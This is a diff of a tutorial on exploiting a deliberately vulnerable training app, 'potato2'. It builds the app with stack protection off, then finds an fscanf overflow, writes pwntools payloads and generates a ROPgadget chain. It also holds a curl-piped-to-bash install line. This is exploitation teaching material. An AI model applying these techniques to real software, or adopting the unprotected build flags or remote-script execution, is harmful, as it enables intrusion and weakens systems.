@@ -17,52 +17,72 @@ sudo apt install python3-virtualenv
 bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
 ```
 
-Before compiling potato2 for i386/32 bit, it is required to compile openssl also for 32bit,
-since that library is linked into the potato application. For that purpose, check out openssl
-into the same parent folder where `potato2` has been checked out and build it for i386:
+Checkout the sources of `potato2` and `openssl`, the latter is required since we are going to
+build potato2 as 32 bit binary, hence the `openssl` libraries need to be available as 32 bit
+as well.
 
 ```sh
+git clone https://github.com/edgecase1/potato2.git
 git clone https://github.com/openssl/openssl.git
 cd openssl
 ./Configure -m32 linux-generic32
 make -sj
+cd ..
+make -sj
+cp potato2/userlist .
 ```
 
-In the last step, a new `Makefile` is created within `potato2`, i.e. in the parent folder of `src`.
-It be used/adapted in the subsequent steps:
+The second make builds two binaries, `potato2` and `potato2_rop` which are going to be
+the victim apps in the subsequent steps. Since the built `potato2` binaries require to have
+the `userlist` file present in the current folder, this file is copied from the `potato2`
+folder.
 
 ```Makefile
+# needs to have openssl checked out as sibling folder of potato
+# git clone https://github.com/openssl/openssl.git
+# and requires installation of gcc multilib
+# sudo apt install gcc-multilib for m32
+
 WARN_OPTS=-Wno-deprecated-declarations -Wno-unused-result
 SEC_OPTS=-fno-stack-protector -z execstack -no-pie
 DEBUG_OPTS=-ggdb3 -O0
-INCLUDES=-I../openssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Isrc
+# turn on optimizations to get some ROP gadgets
+DEBUG_OPTS_ROP=-ggdb3 -O2
+INCLUDES=-Iopenssl/include -I/usr/include -I/usr/include/x86_64-linux-gnu -Ipotato2/src
 DEFINES=-D_FORTIFY_SOURCE=0
 
 CCOPTS = $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS) $(INCLUDES) $(DEFINES)
+# include glibc statically to get additional gadgets
+CCOPTS4ROP = -static $(WARN_OPTS) $(SEC_OPTS) $(DEBUG_OPTS_ROP) $(INCLUDES) $(DEFINES)
 
 CFILES = \
-	src/main.c \
-	src/runr.c \
-	src/sock.c \
-	src/userlist.c \
-	src/func.c \
-	src/login2.c
+	potato2/src/main.c \
+	potato2/src/runr.c \
+	potato2/src/sock.c \
+	potato2/src/userlist.c \
+	potato2/src/func.c \
+	potato2/src/login2.c
 
 HFILES = \
-	src/runr.h \
-	src/sock.h \
-	src/user.h \
-	src/userlist.h 
+	potato2/src/runr.h \
+	potato2/src/sock.h \
+	potato2/src/user.h \
+	potato2/src/userlist.h 
 
 .PHONY: clean all
 
-all: potato
+all: potato potato_rop
 
+# binary for usual attacks
 potato: $(CFILES) $(HFILES)
-	gcc -m32 $(CCOPTS) -o potato $(CFILES) -L../openssl  -lssl -lcrypto 
+	gcc -m32 $(CCOPTS) -o potato $(CFILES) -Lopenssl  -lssl -lcrypto 
+
+# binary for ROP attack
+potato_rop: $(CFILES) $(HFILES)
+	gcc -m32 $(CCOPTS4ROP) -o potato_rop $(CFILES) -Lopenssl  -lssl -lcrypto 
 
 clean:
-	rm -f potato 
+	rm -f potato potato_rop
 ```
 
 Now, potato2 can be built and run in the `potato` folder:
@@ -88,7 +108,7 @@ Before looking at the code, `grep` can be used for a quick scan through the sour
 C stdlib functions that are insecure, or can be used in an insecure way:
 
 ```bash
-find src -name "*.c" | xargs grep -w -n \
+find potato2/src -name "*.c" | xargs grep -w -n \
   -e "gets" \
   -e "strcpy" \
   -e "strcat" \
@@ -101,16 +121,16 @@ find src -name "*.c" | xargs grep -w -n \
   -e "memmove" \
   -e "strtok"
 
-src/login2.c:43:    strcpy(user->name, username);
-src/login2.c:44:    sprintf(user->home, "/home/%s", username);
-src/login2.c:45:    strcpy(user->shell, "/usr/bin/rbash");
-src/func.c:60:    scanf("%d", &id);
-src/func.c:187:    fscanf(stdin, "%s", input_username); // TODO security
-src/userlist.c:240:    token = strtok(line, ":");
-src/userlist.c:246:                strcpy(parsed_user->name, token);
-src/userlist.c:257:                     strcpy(parsed_user->home, token);
-src/userlist.c:260:                     strcpy(parsed_user->shell, token);
-src/userlist.c:266:       token = strtok(NULL, ":");
+potato2/src/login2.c:43:    strcpy(user->name, username);
+potato2/src/login2.c:44:    sprintf(user->home, "/home/%s", username);
+potato2/src/login2.c:45:    strcpy(user->shell, "/usr/bin/rbash");
+potato2/src/func.c:60:    scanf("%d", &id);
+potato2/src/func.c:187:    fscanf(stdin, "%s", input_username); // TODO security
+potato2/src/userlist.c:240:    token = strtok(line, ":");
+potato2/src/userlist.c:246:                strcpy(parsed_user->name, token);
+potato2/src/userlist.c:257:                     strcpy(parsed_user->home, token);
+potato2/src/userlist.c:260:                     strcpy(parsed_user->shell, token);
+potato2/src/userlist.c:266:       token = strtok(NULL, ":");
 ```
 
 The code at `func.c`, line 187 look promising. The function `fscanf` in `change_name()` reads
@@ -169,8 +189,8 @@ pip install pwntools
 python3 pwn_potato.py
 ```
 
-Change the `elf` variable in `pwn_potato.py` such that it runs the binary `./potato` in the current
-folder, and stops in line 192 of func.c, the epilogue of `change_name()`. When `./potato` asks for a new name,
+Change the `elf` variable in `pwn_potato.py` such that it runs the binary `./potato2/potato` in the current
+folder, and stops in line 192 of func.c, the epilogue of `change_name()`. When `./potato2/potato` asks for a new name,
 the script provides 100 'A's, which will be enough to invoke a buffer overflow:
 
 ```python
@@ -179,7 +199,7 @@ the script provides 100 'A's, which will be enough to invoke a buffer overflow:
 from pwn import *
 import sys
 
-elf = ELF("./potato")
+elf = ELF("./potato2/potato")
 context.binary = elf
 context.arch = 'i386'
 context.bits = 32
@@ -207,7 +227,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-The python script is executed via `python3 pwn_potato.py`.
+The python script is executed via `python3 pwn_potato.py`, or directly via `./pwn_potato.py`.
 
 In the `gef` window, we issue `ni` which steps over the next assembly statement, then press enter a few times
 until the debugger halts at the `ret` statement. In the next step, the debugger will set the instruction pointer
@@ -413,19 +433,18 @@ ROP chain generation
 ```
 
 The low number of gadgets is caused by the fact that libc is linked dynamically into the `potato` application,
-i.e. `ROPgadget` cannot find any libc functions to take advantage of. This can be overcome by rebuilding the
-application while statically linking libc into it via the `-static` linker option, and by turning optimizations
-to -O2:
+i.e. `ROPgadget` cannot find any libc functions to take advantage of. This can be overcome by building `potato_rop` 
+which links libc statically and by turns code optimizations on to -O2:
 
 ```makefile
 ...
 DEBUG_OPTS=-ggdb3 -O2
 ...
 potato: $(CFILES) $(HFILES)
-	gcc -static -m32 $(CCOPTS) -o potato $(CFILES) -L../openssl  -lssl -lcrypto 
+	gcc -static -m32 $(CCOPTS) -o potato_rop $(CFILES) -Lopenssl  -lssl -lcrypto 
 ```
 
-Recompile the binary via `make clean && make -sj`, then run `ROPGadget` again:
+When running `ROPgadget --binary potato_rop --ropchain`, we get:
 
 ```
 ...
@@ -448,10 +467,10 @@ p += pack('<I', 0x0811e040) # @ .data
 p += pack('<I', 0x0804c6c2) # int 0x80
 ```
 
-The generated ROP chain can not yet be used in `pwn_potato2.py`, some characters in the ROP chain 
-prevent the copying of the complete payload onto the stack, so to avoid their generation: 
+The generated ROP chain can not yet be used in `pwn_potato2.py`, some bytes in the ROP chain 
+prevent the copying of the complete payload onto the stack, so to avoid their usage: 
 `ROPgadget --binary potato_rop --ropchain --badbytes "00|09|0c|0d"`.
-This generates a ROP chain, which is copied completely, however the ROP chain uses one gadget that
+This generates a ROP chain, which is copied completely, however the ROP chain still uses one gadget that
 must be replaced:
 
 ```python
@@ -482,7 +501,7 @@ from struct import pack
 
 import sys
 
-elf = ELF("./potato_rop")
+elf = ELF("./potato2/potato_rop")
 context.binary = elf
 context.arch = 'i386'
 context.bits = 32
